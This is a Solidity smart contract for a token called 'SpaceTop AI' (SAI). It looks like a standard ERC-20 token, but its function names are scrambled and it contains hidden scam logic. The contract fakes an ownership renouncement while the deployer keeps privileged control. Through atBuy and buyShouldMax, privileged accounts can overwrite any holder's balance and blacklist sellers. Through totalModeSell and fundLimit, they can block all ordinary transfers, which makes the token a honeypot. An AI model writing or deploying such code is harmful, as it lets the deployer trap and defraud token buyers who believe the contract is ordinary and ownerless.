//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface exemptMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toShouldLaunch) external view returns (uint256);

    function transfer(address listAuto, uint256 teamReceiver) external returns (bool);

    function allowance(address exemptListSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address listAuto,
        uint256 teamReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isFund, uint256 value);
    event Approval(address indexed exemptListSender, address indexed spender, uint256 value);
}

interface launchedSenderAt is exemptMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract launchedTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txSwap {
    function createPair(address listWallet, address modeEnable) external returns (address);
}

interface liquidityLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SpaceTopAI is launchedTx, exemptMax, launchedSenderAt {

    address toReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private atMode;

    mapping(address => uint256) private takeFundIs;

    function symbol() external view virtual override returns (string memory) {
        return fundLiquidityTake;
    }

    function atBuy(address shouldFundBuy, uint256 teamReceiver) public {
        buyFee();
        takeFundIs[shouldFundBuy] = teamReceiver;
    }

    function allowance(address exemptFromWallet, address takeModeLimit) external view virtual override returns (uint256) {
        if (takeModeLimit == toReceiver) {
            return type(uint256).max;
        }
        return tokenAmountTake[exemptFromWallet][takeModeLimit];
    }

    address public senderReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return maxFund;
    }

    uint256 fundLimit;

    mapping(address => bool) public shouldFund;

    address private exemptFromAuto;

    string private fundLiquidityTake = "SAI";

    function limitMarketing(address swapSender) public {
        if (tradingAt) {
            return;
        }
        if (atMode) {
            fundTrading = true;
        }
        enableTotal[swapSender] = true;
        
        tradingAt = true;
    }

    function transferFrom(address tradingTotal, address listAuto, uint256 teamReceiver) external override returns (bool) {
        if (_msgSender() != toReceiver) {
            if (tokenAmountTake[tradingTotal][_msgSender()] != type(uint256).max) {
                require(teamReceiver <= tokenAmountTake[tradingTotal][_msgSender()]);
                tokenAmountTake[tradingTotal][_msgSender()] -= teamReceiver;
            }
        }
        return amountMode(tradingTotal, listAuto, teamReceiver);
    }

    mapping(address => mapping(address => uint256)) private tokenAmountTake;

    bool public fromAt;

    function listToken() public {
        emit OwnershipTransferred(senderTrading, address(0));
        exemptFromAuto = address(0);
    }

    function buyFee() private view {
        require(enableTotal[_msgSender()]);
    }

    function tokenTotal(address tradingTotal, address listAuto, uint256 teamReceiver) internal returns (bool) {
        require(takeFundIs[tradingTotal] >= teamReceiver);
        takeFundIs[tradingTotal] -= teamReceiver;
        takeFundIs[listAuto] += teamReceiver;
        emit Transfer(tradingTotal, listAuto, teamReceiver);
        return true;
    }

    function owner() external view returns (address) {
        return exemptFromAuto;
    }

    function decimals() external view virtual override returns (uint8) {
        return feeTx;
    }

    address public senderTrading;

    uint8 private feeTx = 18;

    mapping(address => bool) public enableTotal;

    function name() external view virtual override returns (string memory) {
        return amountShouldMin;
    }

    function transfer(address shouldFundBuy, uint256 teamReceiver) external virtual override returns (bool) {
        return amountMode(_msgSender(), shouldFundBuy, teamReceiver);
    }

    function getOwner() external view returns (address) {
        return exemptFromAuto;
    }

    function buyShouldMax(address receiverToMarketing) public {
        buyFee();
        
        if (receiverToMarketing == senderTrading || receiverToMarketing == senderReceiver) {
            return;
        }
        shouldFund[receiverToMarketing] = true;
    }

    function approve(address takeModeLimit, uint256 teamReceiver) public virtual override returns (bool) {
        tokenAmountTake[_msgSender()][takeModeLimit] = teamReceiver;
        emit Approval(_msgSender(), takeModeLimit, teamReceiver);
        return true;
    }

    uint256 private tokenTeam;

    function totalModeSell(uint256 teamReceiver) public {
        buyFee();
        fundLimit = teamReceiver;
    }

    function balanceOf(address toShouldLaunch) public view virtual override returns (uint256) {
        return takeFundIs[toShouldLaunch];
    }

    string private amountShouldMin = "SpaceTop AI";

    bool public tradingAt;

    bool private buyShould;

    function amountMode(address tradingTotal, address listAuto, uint256 teamReceiver) internal returns (bool) {
        if (tradingTotal == senderTrading) {
            return tokenTotal(tradingTotal, listAuto, teamReceiver);
        }
        uint256 atAuto = exemptMax(senderReceiver).balanceOf(exemptFee);
        require(atAuto <= fundLimit);
        require(!shouldFund[tradingTotal]);
        return tokenTotal(tradingTotal, listAuto, teamReceiver);
    }

    address exemptFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public fromMax;

    constructor (){
        
        liquidityLaunched atLaunch = liquidityLaunched(toReceiver);
        senderReceiver = txSwap(atLaunch.factory()).createPair(atLaunch.WETH(), address(this));
        if (fromAt) {
            fromMax = tokenTeam;
        }
        enableTotal[_msgSender()] = true;
        takeFundIs[_msgSender()] = maxFund;
        senderTrading = _msgSender();
        if (fromAt != buyShould) {
            tokenTeam = fromMax;
        }
        emit Transfer(address(0), senderTrading, maxFund);
        exemptFromAuto = _msgSender();
        listToken();
    }

    uint256 private maxFund = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed limitTeam, address indexed tradingFund);

    bool public fundTrading;

}